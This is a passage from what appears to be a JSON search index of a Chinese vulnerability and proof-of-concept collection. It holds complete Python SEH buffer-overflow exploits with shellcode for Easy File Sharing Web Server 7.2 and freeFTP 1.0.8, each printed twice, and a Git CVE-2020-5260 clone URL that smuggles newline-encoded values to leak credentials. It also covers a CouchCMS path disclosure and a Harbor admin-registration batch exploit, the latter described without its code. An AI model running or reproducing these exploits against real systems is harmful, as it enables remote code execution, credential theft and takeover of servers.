2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Couch through 2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e 2018-03-04 zzw ( zzw@5ecurity.cn ) https://github.com/CouchCMS/CouchCMS/ https://github.com/CouchCMS/CouchCMS/ 2.0 CVE-2018-7662","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#_2","text":"Couch through 2.0\u5b58\u5728\u8def\u5f84\u6cc4\u9732\u6f0f\u6d1e\uff0c\u5f53\u8bbf\u95ee\u7279\u5b9aurl\u65f6\u7cfb\u7edf\u8fd4\u56de\u7684\u62a5\u9519\u4fe1\u606f\u4e2d\u66b4\u9732\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002Couch through\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7 issues \u544a\u77e5\u4f5c\u8005\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Cobub%20razor/Couch%20through%202.0%E5%AD%98%E5%9C%A8%E8%B7%AF%E5%BE%84%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/#poc","text":"\u8bbf\u95ee\u5982\u4e0b\u9875\u9762\uff0c\u62a5\u9519\u4fe1\u606f\u4e2d\u663e\u793a\u5b8c\u6574\u7269\u7406\u8def\u5f84\u4fe1\u606f\u3002 Location: includes/mysql2i/mysql2i.func.php addons/phpmailer/phpmailer.php","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Easy%20File%20Sharing%20Web%20Server/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20%28SEH%29/","text":"Easy File Sharing Web Server 7.2 - GET \u7f13\u51b2\u533a\u6ea2\u51fa (SEH) \u00b6 POC \u00b6 # Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP request SEH Buffer Overflow # Tested on: XP SP3 EN # category: Remote Exploit # Usage: ./exploit.py ip port import socket import sys host = str ( sys . argv [ 1 ]) port = int ( sys . argv [ 2 ]) a = socket . socket () print \"Connecting to: \" + host + \":\" + str ( port ) a . connect (( host , port )) entire = 4500 # Junk buff = \"A\" * 4061 # Next SEH buff += \" \\xeb\\x0A\\x90\\x90 \" # pop pop ret buff += \" \\x98\\x97\\x01\\x10 \" buff += \" \\x90 \" * 19 # calc.exe # Bad Characters: \\x20 \\x2f \\x5c shellcode = ( \" \\xd9\\xcb\\xbe\\xb9\\x23\\x67\\x31\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9 \" \" \\xb1\\x13\\x31\\x72\\x19\\x83\\xc2\\x04\\x03\\x72\\x15\\x5b\\xd6\\x56 \" \" \\xe3\\xc9\\x71\\xfa\\x62\\x81\\xe2\\x75\\x82\\x0b\\xb3\\xe1\\xc0\\xd9 \" \" \\x0b\\x61\\xa0\\x11\\xe7\\x03\\x41\\x84\\x7c\\xdb\\xd2\\xa8\\x9a\\x97 \" \" \\xba\\x68\\x10\\xfb\\x5b\\xe8\\xad\\x70\\x7b\\x28\\xb3\\x86\\x08\\x64 \" \" \\xac\\x52\\x0e\\x8d\\xdd\\x2d\\x3c\\x3c\\xa0\\xfc\\xbc\\x82\\x23\\xa8 \" \" \\xd7\\x94\\x6e\\x23\\xd9\\xe3\\x05\\xd4\\x05\\xf2\\x1b\\xe9\\x09\\x5a \" \" \\x1c\\x39\\xbd \" ) buff += shellcode buff += \" \\x90 \" * 7 buff += \"A\" * ( 4500 - 4061 - 4 - 4 - 20 - len ( shellcode ) - 20 ) # GET a . send ( \"GET \" + buff + \" HTTP/1.0 \\r\\n\\r\\n \" ) a . close () print \"Done...\"","title":"Easy File Sharing Web Server 7.2   GET \u7f13\u51b2\u533a\u6ea2\u51fa (SEH)"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Easy%20File%20Sharing%20Web%20Server/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20%28SEH%29/#easy-file-sharing-web-server-72-get-seh","text":"","title":"Easy File Sharing Web Server 7.2 - GET \u7f13\u51b2\u533a\u6ea2\u51fa (SEH)"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Easy%20File%20Sharing%20Web%20Server/Easy%20File%20Sharing%20Web%20Server%207.2%20-%20GET%20%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%20%28SEH%29/#poc","text":"# Exploit Title: Easy File Sharing Web Server 7.2 - GET HTTP request SEH Buffer Overflow # Tested on: XP SP3 EN # category: Remote Exploit # Usage: ./exploit.py ip port import socket import sys host = str ( sys . argv [ 1 ]) port = int ( sys . argv [ 2 ]) a = socket . socket () print \"Connecting to: \" + host + \":\" + str ( port ) a . connect (( host , port )) entire = 4500 # Junk buff = \"A\" * 4061 # Next SEH buff += \" \\xeb\\x0A\\x90\\x90 \" # pop pop ret buff += \" \\x98\\x97\\x01\\x10 \" buff += \" \\x90 \" * 19 # calc.exe # Bad Characters: \\x20 \\x2f \\x5c shellcode = ( \" \\xd9\\xcb\\xbe\\xb9\\x23\\x67\\x31\\xd9\\x74\\x24\\xf4\\x5a\\x29\\xc9 \" \" \\xb1\\x13\\x31\\x72\\x19\\x83\\xc2\\x04\\x03\\x72\\x15\\x5b\\xd6\\x56 \" \" \\xe3\\xc9\\x71\\xfa\\x62\\x81\\xe2\\x75\\x82\\x0b\\xb3\\xe1\\xc0\\xd9 \" \" \\x0b\\x61\\xa0\\x11\\xe7\\x03\\x41\\x84\\x7c\\xdb\\xd2\\xa8\\x9a\\x97 \" \" \\xba\\x68\\x10\\xfb\\x5b\\xe8\\xad\\x70\\x7b\\x28\\xb3\\x86\\x08\\x64 \" \" \\xac\\x52\\x0e\\x8d\\xdd\\x2d\\x3c\\x3c\\xa0\\xfc\\xbc\\x82\\x23\\xa8 \" \" \\xd7\\x94\\x6e\\x23\\xd9\\xe3\\x05\\xd4\\x05\\xf2\\x1b\\xe9\\x09\\x5a \" \" \\x1c\\x39\\xbd \" ) buff += shellcode buff += \" \\x90 \" * 7 buff += \"A\" * ( 4500 - 4061 - 4 - 4 - 20 - len ( shellcode ) - 20 ) # GET a . send ( \"GET \" + buff + \" HTTP/1.0 \\r\\n\\r\\n \" ) a . close () print \"Done...\"","title":"POC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FreeFtp/freeFTP1.0.8-%27PASS%27%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/","text":"freeFTP1.0.8-'PASS'\u8fdc\u7a0b\u7f13\u51b2\u533a\u6ea2\u51fa \u00b6 POC \u00b6 # Exploit Title: freeFTP 1.0.8 - Remote Buffer Overflow # Date: 2019-09-01 # Author: Chet Manly # Software Link: https://download.cnet.com/FreeFTP/3000-2160_4-10047242.html # Version: 1.0.8 # CVE: N/A from ftplib import FTP buf = \"\" buf += \" \\x89\\xe1\\xdb\\xdf\\xd9\\x71\\xf4\\x5e\\x56\\x59\\x49\\x49\\x49 \" buf += \" \\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43 \" buf += \" \\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41 \" buf += \" \\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42 \" buf += \" \\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\\x69\\x6c\\x48\\x68\\x6d \" buf += \" \\x52\\x57\\x70\\x75\\x50\\x63\\x30\\x51\\x70\\x6c\\x49\\x38\\x65 \" buf += \" \\x64\\x71\\x79\\x50\\x31\\x74\\x6e\\x6b\\x52\\x70\\x44\\x70\\x4e \" buf += \" \\x6b\\x66\\x32\\x44\\x4c\\x6c\\x4b\\x30\\x52\\x57\\x64\\x4c\\x4b \" buf += \" \\x43\\x42\\x64\\x68\\x36\\x6f\\x58\\x37\\x32\\x6a\\x55\\x76\\x36 \" buf += \" \\x51\\x79\\x6f\\x6c\\x6c\\x77\\x4c\\x61\\x71\\x43\\x4c\\x63\\x32 \" buf += \" \\x56\\x4c\\x47\\x50\\x6b\\x71\\x5a\\x6f\\x34\\x4d\\x45\\x51\\x6f \" buf += \" \\x37\\x68\\x62\\x6a\\x52\\x76\\x32\\x70\\x57\\x4c\\x4b\\x73\\x62 \" buf += \" \\x44\\x50\\x4c\\x4b\\x72\\x6a\\x77\\x4c\\x6c\\x4b\\x72\\x6c\\x57 \" buf += \" \\x61\\x52\\x58\\x49\\x73\\x47\\x38\\x33\\x31\\x68\\x51\\x66\\x31 \" buf += \" \\x6c\\x4b\\x31\\x49\\x55\\x70\\x47\\x71\\x69\\x43\\x6c\\x4b\\x72 \" buf += \" \\x69\\x32\\x38\\x39\\x73\\x64\\x7a\\x63\\x79\\x4c\\x4b\\x37\\x44 \" buf += \" \\x6c\\x4b\\x66\\x61\\x4a\\x76\\x35\\x61\\x39\\x6f\\x6c\\x6c\\x6f \" buf += \" \\x31\\x68\\x4f\\x54\\x4d\\x33\\x31\\x78\\x47\\x35\\x68\\x49\\x70 \" buf += \" \\x30\\x75\\x49\\x66\\x45\\x53\\x51\\x6d\\x49\\x68\\x37\\x4b\\x73 \" buf += \" \\x4d\\x61\\x34\\x71\\x65\\x6d\\x34\\x36\\x38\\x4c\\x4b\\x32\\x78 \" buf += \" \\x65\\x74\\x66\\x61\\x6a\\x73\\x65\\x36\\x4c\\x4b\\x74\\x4c\\x30 \" buf += \" \\x4b\\x4c\\x4b\\x51\\x48\\x57\\x6c\\x75\\x51\\x6a\\x73\\x6c\\x4b \" buf += \" \\x53\\x34\\x6e\\x6b\\x43\\x31\\x4a\\x70\\x4d\\x59\\x53\\x74\\x66 \" buf += \" \\x44\\x55\\x74\\x53\\x6b\\x31\\x4b\\x63\\x51\\x36\\x39\\x62\\x7a \" buf += \" \\x62\\x71\\x69\\x6f\\x6d\\x30\\x71\\x4f\\x51\\x4f\\x71\\x4a\\x4e \" buf += \" \\x6b\\x62\\x32\\x6a\\x4b\\x6e\\x6d\\x53\\x6d\\x70\\x6a\\x47\\x71 \" buf += \" \\x4c\\x4d\\x4e\\x65\\x4c\\x72\\x53\\x30\\x65\\x50\\x47\\x70\\x66 \" buf += \" \\x30\\x30\\x68\\x65\\x61\\x4c\\x4b\\x32\\x4f\\x4c\\x47\\x6b\\x4f \" buf += \" \\x69\\x45\\x4d\\x6b\\x6c\\x30\\x48\\x35\\x4e\\x42\\x71\\x46\\x52 \" buf += \" \\x48\\x59\\x36\\x4a\\x35\\x4d\\x6d\\x6d\\x4d\\x79\\x6f\\x38\\x55 \" buf += \" \\x47\\x4c\\x33\\x36\\x53\\x4c\\x56\\x6a\\x6f\\x70\\x49\\x6b\\x6b \" buf += \" \\x50\\x73\\x45\\x37\\x75\\x6d\\x6b\\x31\\x57\\x46\\x73\\x63\\x42 \" buf += \" \\x72\\x4f\\x43\\x5a\\x45\\x50\\x56\\x33\\x4b\\x4f\\x48\\x55\\x55 \" buf += \" \\x33\\x35\\x31\\x32\\x4c\\x53\\x53\\x66\\x4e\\x55\\x35\\x72\\x58 \" buf += \" \\x45\\x35\\x53\\x30\\x41\\x41 \" buf = 'A' * 276 buf += ' \\x90 ' * 10 buf += shellcode buf += 'B' * ( 486 - len ( shellcode )) buf += ' \\x58 ' # pop eax buf += ' \\xfe\\xcc ' # dec ah buf += ' \\xfe\\xcc ' # dec ah buf += ' \\xff\\xe0 ' # jmp eax buf += 'C' * 4 buf += ' \\xe8\\xf0\\xff\\xff\\xff ' # call near buf += 'D' * 9 buf += ' \\xeb\\xf0\\x90\\x90 ' # jump backwards buf += ' \\xc0\\x3d\\x42\\x00 ' # 0x00423dc0 - pop, pop, ret buf += 'E' * ( 1000 - len ( buf )) ftp = FTP () ftp . connect ( '192.168.1.1' , 21 ) ftp . login ( 'anonymous' , buf )","title":"freeFTP1.0.8 'PASS'\u8fdc\u7a0b\u7f13\u51b2\u533a\u6ea2\u51fa"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FreeFtp/freeFTP1.0.8-%27PASS%27%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/#freeftp108-pass","text":"","title":"freeFTP1.0.8-'PASS'\u8fdc\u7a0b\u7f13\u51b2\u533a\u6ea2\u51fa"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/FreeFtp/freeFTP1.0.8-%27PASS%27%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/#poc","text":"# Exploit Title: freeFTP 1.0.8 - Remote Buffer Overflow # Date: 2019-09-01 # Author: Chet Manly # Software Link: https://download.cnet.com/FreeFTP/3000-2160_4-10047242.html # Version: 1.0.8 # CVE: N/A from ftplib import FTP buf = \"\" buf += \" \\x89\\xe1\\xdb\\xdf\\xd9\\x71\\xf4\\x5e\\x56\\x59\\x49\\x49\\x49 \" buf += \" \\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43 \" buf += \" \\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41 \" buf += \" \\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42 \" buf += \" \\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\\x69\\x6c\\x48\\x68\\x6d \" buf += \" \\x52\\x57\\x70\\x75\\x50\\x63\\x30\\x51\\x70\\x6c\\x49\\x38\\x65 \" buf += \" \\x64\\x71\\x79\\x50\\x31\\x74\\x6e\\x6b\\x52\\x70\\x44\\x70\\x4e \" buf += \" \\x6b\\x66\\x32\\x44\\x4c\\x6c\\x4b\\x30\\x52\\x57\\x64\\x4c\\x4b \" buf += \" \\x43\\x42\\x64\\x68\\x36\\x6f\\x58\\x37\\x32\\x6a\\x55\\x76\\x36 \" buf += \" \\x51\\x79\\x6f\\x6c\\x6c\\x77\\x4c\\x61\\x71\\x43\\x4c\\x63\\x32 \" buf += \" \\x56\\x4c\\x47\\x50\\x6b\\x71\\x5a\\x6f\\x34\\x4d\\x45\\x51\\x6f \" buf += \" \\x37\\x68\\x62\\x6a\\x52\\x76\\x32\\x70\\x57\\x4c\\x4b\\x73\\x62 \" buf += \" \\x44\\x50\\x4c\\x4b\\x72\\x6a\\x77\\x4c\\x6c\\x4b\\x72\\x6c\\x57 \" buf += \" \\x61\\x52\\x58\\x49\\x73\\x47\\x38\\x33\\x31\\x68\\x51\\x66\\x31 \" buf += \" \\x6c\\x4b\\x31\\x49\\x55\\x70\\x47\\x71\\x69\\x43\\x6c\\x4b\\x72 \" buf += \" \\x69\\x32\\x38\\x39\\x73\\x64\\x7a\\x63\\x79\\x4c\\x4b\\x37\\x44 \" buf += \" \\x6c\\x4b\\x66\\x61\\x4a\\x76\\x35\\x61\\x39\\x6f\\x6c\\x6c\\x6f \" buf += \" \\x31\\x68\\x4f\\x54\\x4d\\x33\\x31\\x78\\x47\\x35\\x68\\x49\\x70 \" buf += \" \\x30\\x75\\x49\\x66\\x45\\x53\\x51\\x6d\\x49\\x68\\x37\\x4b\\x73 \" buf += \" \\x4d\\x61\\x34\\x71\\x65\\x6d\\x34\\x36\\x38\\x4c\\x4b\\x32\\x78 \" buf += \" \\x65\\x74\\x66\\x61\\x6a\\x73\\x65\\x36\\x4c\\x4b\\x74\\x4c\\x30 \" buf += \" \\x4b\\x4c\\x4b\\x51\\x48\\x57\\x6c\\x75\\x51\\x6a\\x73\\x6c\\x4b \" buf += \" \\x53\\x34\\x6e\\x6b\\x43\\x31\\x4a\\x70\\x4d\\x59\\x53\\x74\\x66 \" buf += \" \\x44\\x55\\x74\\x53\\x6b\\x31\\x4b\\x63\\x51\\x36\\x39\\x62\\x7a \" buf += \" \\x62\\x71\\x69\\x6f\\x6d\\x30\\x71\\x4f\\x51\\x4f\\x71\\x4a\\x4e \" buf += \" \\x6b\\x62\\x32\\x6a\\x4b\\x6e\\x6d\\x53\\x6d\\x70\\x6a\\x47\\x71 \" buf += \" \\x4c\\x4d\\x4e\\x65\\x4c\\x72\\x53\\x30\\x65\\x50\\x47\\x70\\x66 \" buf += \" \\x30\\x30\\x68\\x65\\x61\\x4c\\x4b\\x32\\x4f\\x4c\\x47\\x6b\\x4f \" buf += \" \\x69\\x45\\x4d\\x6b\\x6c\\x30\\x48\\x35\\x4e\\x42\\x71\\x46\\x52 \" buf += \" \\x48\\x59\\x36\\x4a\\x35\\x4d\\x6d\\x6d\\x4d\\x79\\x6f\\x38\\x55 \" buf += \" \\x47\\x4c\\x33\\x36\\x53\\x4c\\x56\\x6a\\x6f\\x70\\x49\\x6b\\x6b \" buf += \" \\x50\\x73\\x45\\x37\\x75\\x6d\\x6b\\x31\\x57\\x46\\x73\\x63\\x42 \" buf += \" \\x72\\x4f\\x43\\x5a\\x45\\x50\\x56\\x33\\x4b\\x4f\\x48\\x55\\x55 \" buf += \" \\x33\\x35\\x31\\x32\\x4c\\x53\\x53\\x66\\x4e\\x55\\x35\\x72\\x58 \" buf += \" \\x45\\x35\\x53\\x30\\x41\\x41 \" buf = 'A' * 276 buf += ' \\x90 ' * 10 buf += shellcode buf += 'B' * ( 486 - len ( shellcode )) buf += ' \\x58 ' # pop eax buf += ' \\xfe\\xcc ' # dec ah buf += ' \\xfe\\xcc ' # dec ah buf += ' \\xff\\xe0 ' # jmp eax buf += 'C' * 4 buf += ' \\xe8\\xf0\\xff\\xff\\xff ' # call near buf += 'D' * 9 buf += ' \\xeb\\xf0\\x90\\x90 ' # jump backwards buf += ' \\xc0\\x3d\\x42\\x00 ' # 0x00423dc0 - pop, pop, ret buf += 'E' * ( 1000 - len ( buf )) ftp = FTP () ftp . connect ( '192.168.1.1' , 21 ) ftp . login ( 'anonymous' , buf )","title":"POC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/","text":"\u63cf\u8ff0 \u00b6 Git\u4f7f\u7528\u51ed\u8bc1\u52a9\u624b(credential helper)\u6765\u5e2e\u52a9\u7528\u6237\u5b58\u50a8\u548c\u68c0\u7d22\u51ed\u8bc1\u3002\u4f46\u662f\u5f53\u4e00\u4e2aURL\u4e2d\u5305\u542b\u7ecf\u8fc7\u7f16\u7801\u7684\u6362\u884c\u7b26\u65f6\uff0c\u53ef\u80fd\u5c06\u975e\u9884\u671f\u7684\u503c\u6ce8\u5165\u5230credential helper\u7684\u534f\u8bae\u6d41\u4e2d\u3002\u8fd9\u5c06\u4f7f\u6076\u610fURL\u6b3a\u9a97Git\u5ba2\u6237\u7aef\u53bb\u5411\u653b\u51fb\u8005\u53d1\u9001\u4e3b\u673a\u51ed\u636e\u3002\u5f53\u4f7f\u7528\u53d7\u5f71\u54cd\u7248\u672c Git\u5bf9\u6076\u610f URL \u6267\u884c git clone \u547d\u4ee4\u65f6\u4f1a\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002 \u5f71\u54cd\u7248\u672c \u00b6 Git2.17.x <= 2.17.3Git2.18.x <= 2.18.2Git2.19.x <= 2.19.3Git2.20.x <= 2.20.2Git2.21.x <= 2.21.1Git2.22.x <= 2.22.2Git2.23.x <= 2.23.1Git2.24.x <= 2.24.1Git2.25.x <= 2.25.2Git2.26.x <= 2.26.0 poc \u94fe\u63a5\uff1a https://pan.baidu.com/s/1upYlyZFZMDuNZ5YnMnrmaQ \u63d0\u53d6\u7801\uff1ae9iz \u542f\u52a8poc\uff1ago run poc.go git\u5728\u6267\u884c\u7c7b\u4f3c\"git clone https://example.com \" \u8fd9\u6837\u7684\u547d\u4ee4\u65f6,\u4f1a\u8bf7\u6c42\u4f7f\u7528\u534f\u8bae\"https\"\u5b58\u50a8\u4e3b\u673a\"example.com\"\u7684\u51ed\u636e\uff0c\u5e76\u5728\u8fdc\u7a0b\u7aef\u8bf7\u6c42\u8eab\u4efd\u9a8c\u8bc1\u65f6\u5c06\u8fd4\u56de\u7684\u51ed\u636e\u9644\u52a0\u5230\u53d1\u51fa\u7684\u8bf7\u6c42\u4e2d git clone 'http://localhost:8088/%0ahost=github.com%0aprotocol=https' \u83b7\u53d6\u5230git\u7684\u51ed\u8bc1 \u4fee\u590d\u5efa\u8bae \u00b6 \u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"Git\u51ed\u8bc1\u6cc4\u9732\u6f0f\u6d1e\uff08CVE-2020-5260\uff09"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_1","text":"Git\u4f7f\u7528\u51ed\u8bc1\u52a9\u624b(credential helper)\u6765\u5e2e\u52a9\u7528\u6237\u5b58\u50a8\u548c\u68c0\u7d22\u51ed\u8bc1\u3002\u4f46\u662f\u5f53\u4e00\u4e2aURL\u4e2d\u5305\u542b\u7ecf\u8fc7\u7f16\u7801\u7684\u6362\u884c\u7b26\u65f6\uff0c\u53ef\u80fd\u5c06\u975e\u9884\u671f\u7684\u503c\u6ce8\u5165\u5230credential helper\u7684\u534f\u8bae\u6d41\u4e2d\u3002\u8fd9\u5c06\u4f7f\u6076\u610fURL\u6b3a\u9a97Git\u5ba2\u6237\u7aef\u53bb\u5411\u653b\u51fb\u8005\u53d1\u9001\u4e3b\u673a\u51ed\u636e\u3002\u5f53\u4f7f\u7528\u53d7\u5f71\u54cd\u7248\u672c Git\u5bf9\u6076\u610f URL \u6267\u884c git clone \u547d\u4ee4\u65f6\u4f1a\u89e6\u53d1\u8be5\u6f0f\u6d1e\u3002","title":"\u63cf\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_2","text":"Git2.17.x <= 2.17.3Git2.18.x <= 2.18.2Git2.19.x <= 2.19.3Git2.20.x <= 2.20.2Git2.21.x <= 2.21.1Git2.22.x <= 2.22.2Git2.23.x <= 2.23.1Git2.24.x <= 2.24.1Git2.25.x <= 2.25.2Git2.26.x <= 2.26.0 poc \u94fe\u63a5\uff1a https://pan.baidu.com/s/1upYlyZFZMDuNZ5YnMnrmaQ \u63d0\u53d6\u7801\uff1ae9iz \u542f\u52a8poc\uff1ago run poc.go git\u5728\u6267\u884c\u7c7b\u4f3c\"git clone https://example.com \" \u8fd9\u6837\u7684\u547d\u4ee4\u65f6,\u4f1a\u8bf7\u6c42\u4f7f\u7528\u534f\u8bae\"https\"\u5b58\u50a8\u4e3b\u673a\"example.com\"\u7684\u51ed\u636e\uff0c\u5e76\u5728\u8fdc\u7a0b\u7aef\u8bf7\u6c42\u8eab\u4efd\u9a8c\u8bc1\u65f6\u5c06\u8fd4\u56de\u7684\u51ed\u636e\u9644\u52a0\u5230\u53d1\u51fa\u7684\u8bf7\u6c42\u4e2d git clone 'http://localhost:8088/%0ahost=github.com%0aprotocol=https' \u83b7\u53d6\u5230git\u7684\u51ed\u8bc1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Git/Git%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-5260%EF%BC%89/#_3","text":"\u5347\u7ea7\u5230\u6700\u65b0\u7248","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Harbor/CVE-2019-16097/","text":"CVE-2019-16097-batch \u00b6 \u514d\u8d23\u58f0\u660e \u00b6 \u53ea\u505a\u5b89\u5168\u7814\u7a76\u4f7f\u7528\uff0c\u4e0d\u5f97\u505a\u975e\u6cd5\u6d4b\u8bd5\uff0c\u540e\u679c\u81ea\u884c\u627f\u62c5\uff01\uff01\uff01 CVE-2019-16097-batch \u6279\u91cf\u6f0f\u6d1e\u5229\u7528\u811a\u672c \u5728 url.txt\u6587\u4ef6 \u6279\u91cf\u6dfb\u52a0\u76ee\u6807\u5730\u5740 http://1.1.1.1 http://2.2.2.2 \u4f7f\u7528python \u8fd0\u884c \u6b64\u811a\u672c \u5728 result.txt \u53ef\u4ee5\u770b\u5230\u6700\u7ec8\u7684\u9a8c\u8bc1\u7ed3\u679c \u6f0f\u6d1e\u80cc\u666f \u00b6 \u8fd1\u65e5\uff0c\u955c\u50cf\u4ed3\u5e93Harbor\u7206\u51fa\u4efb\u610f\u7ba1\u7406\u5458\u6ce8\u518c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5728\u8bf7\u6c42\u4e2d\u6784\u9020\u7279\u5b9a\u5b57\u7b26\u4e32\uff0c\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002\u6211\u4eec\u5f97\u5230\u6d88\u606f\uff0c\u7b2c\u4e00\u65f6\u95f4\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u4e86\u9a8c\u8bc1\uff0c\u5b98\u65b9\u5df2\u53d1\u5e03\u516c\u544a\u8bf4\u660e\uff0c\u6700\u65b0\u76841.7.6\u548c1.8.3\u5df2\u4fee\u590d\u6b64\u6f0f\u6d1e\uff0c\u8bf7\u4f7f\u7528\u5230\u7684\u7528\u6237\u5c3d\u5feb\u5347\u7ea7\u81f3\u5b89\u5168\u7248\u672c\u3002 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Harbor\u662f\u4e00\u4e2a\u7528\u4e8e\u5b58\u50a8\u548c\u5206\u53d1Docker\u955c\u50cf\u7684\u4f01\u4e1a\u7ea7Registry\u670d\u52a1\u5668\u3002Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c\u4e2d\u7684core/api/user.go\u6587\u4ef6\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u901a\u8fc7\u5728\u8bf7\u6c42\u4e2d\u6dfb\u52a0\u5173\u952e\u53c2\u6570\uff0c\u5373\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u521b\u5efa\u7ba1\u7406\u5458\u8d26\u6237\uff0c\u4ece\u800c\u63a5\u7ba1Harbor\u955c\u50cf\u4ed3\u5e93\u3002 \u5f71\u54cd\u7248\u672c \u00b6 Harbor 1.7.0\u7248\u672c\u81f31.8.2\u7248\u672c \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6211\u4eec\u901a\u8fc7\u7f16\u5199\u6279\u91cf\u9a8c\u8bc1\u811a\u672c\uff0c\u6210\u529f\u590d\u73b0\u4e86\u8be5\u6f0f\u6d1e\u3002 \u811a\u672cgithub\u83b7\u53d6 \u5b89\u5168\u5efa\u8bae \u00b6 \u5347\u7ea7Harbor\u7248\u672c\u5230 1.7.6 \u548c 1.8.3 \u53c2\u8003\u4e0b\u8f7d\u94fe\u63a5\uff1a https://github.com/goharbor/harbor/releases \u53c2\u8003\u94fe\u63a5 \u00b6 https://github.com/evilAdan0s/CVE-2019-16097 https://github.com/goharbor/harbor/issues/8951 